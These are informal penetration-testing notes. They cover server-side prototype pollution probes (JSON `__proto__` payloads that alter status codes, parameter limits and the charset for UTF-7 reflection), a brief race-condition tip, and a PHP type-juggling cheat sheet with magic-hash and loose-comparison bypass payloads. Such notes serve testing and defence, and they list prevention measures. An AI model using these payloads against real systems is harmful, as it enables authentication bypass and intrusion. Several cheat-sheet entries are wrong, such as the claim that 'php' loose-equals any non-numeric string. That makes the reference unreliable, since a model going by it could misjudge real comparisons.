## Prototype Pollution

#### Exploitation

- Vulnerable NodeJS libraries: [here](https://raw.githubusercontent.com/HoLyVieR/prototype-pollution-nsec18/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)
- Access prototype of an object via `__proto__` or `constructor.prototype` property
- Client-side prototype pollution vulnerabilities: [here](https://github.com/BlackFan/client-side-prototype-pollution)
- Safe Identification: [here](https://portswigger.net/research/server-side-prototype-pollution)
    - Status Code: `__proto__.status`
    - Parameter Limit: `__proto__.parameterLimit`
    - Content-Type: `__proto__.content-type`

#### Prevention

- Check user-supplied properties against a whitelist
- Freeze prototype by calling `Object.freeze()`
- Create object without prototype with `Object.create(null)`


1- Manipulate Status code :
	-provide bad json body and check the response code , lets say its 400
	-send ""
	
	    "__proto__":{
	        "THE PARAM YOU WANT TO MODIFY":"THE VALUE YOU WANT"
	    }
	    OR
	    "constructor": {
		    "prototype": {
			      "status":555 ,
			      "statusCode": 555
		    }
		  }
	
	-send the bad json body again and check if the status code changed

2-Parameter Limiting :
	- if GET params are reflect in response i.e ?test=123&man=234 and the body contain "test":"123","man":"234"
	- send
	`{`
	    `"__proto__":{`
	        `"parameterLimit":1`
	    `}`
	`}`
	it can also 

	- now sent the params again and check if both are reflected or only 1 

3-Content type
	- we need a param reflected in the response
	- craft a UTF-7 word i.e    "HelloWorld+ACEAIQAh-" which equals HelloWorld!!!
	- now send it and notice it reflected with out decoding
	- now send
	{
	    "__proto__":{
	        "content-type":"application/json; charset=utf-7"
	    }
	}
	
	now resend "HelloWorld+ACEAIQAh-" and check if its reflected the same or HelloWorld!!!



# Race Condition

-check the timing of the responses
-Try race condition: each request with diff session 


## ✅ PHP Type Juggling Cheat Sheet

### Comparison Rules (`==`)

|Operand 1|Operand 2|Behavior|
|---|---|---|
|`string`|`string`|Numerical or lexical comparison|
|`null`|`string`|Convert `null` to `""`|
|`null`|anything but `string`|Convert both to `bool`|
|`bool`|anything|Convert both to `bool`|
|`int`|`string`|Convert `string` to `int`|
|`float`|`string`|Convert `string` to `float`|

### Magic Hashes

Any hash starting with `0e` followed by only digits equals `0` under loose comparison:

```
"0e529201492" == "0e137951649" == 0  → TRUE
```

**Attack strategy:**

1. Make the target hash start with `0e`
2. Brute-force your input until your hash also starts with `0e`
3. Both evaluate to `0` → bypass

### Common Bypass Payloads

| Payload | Type   | Loose-equals                     |
| ------- | ------ | -------------------------------- |
| `0`     | int    | `"0e..."`, `""`, `null`, `false` |
| `1`     | int    | `"1abc"`, `true`                 |
| `-1`    | int    | `"-1abc"`                        |
| `true`  | bool   | any non-empty string             |
| `false` | bool   | `""`, `null`, `0`, `[]`          |
| `null`  | null   | `""`, `0`, `false`               |
| `""`    | string | `null`, `false`                  |
| `"php"` | string | `true`, any non-numeric string   |
| `[]`    | array  | `false`, `null`                  |

### Quick Reference

```php
"0e123"  == 0      → TRUE  (scientific notation)
"1"      == true   → TRUE  (cast to bool)
""       == false  → TRUE  (empty = false)
"0"      == false  → TRUE  (zero = false)
null     == false  → TRUE
[]       == false  → TRUE
"php"    == true   → TRUE  (non-empty string)
```
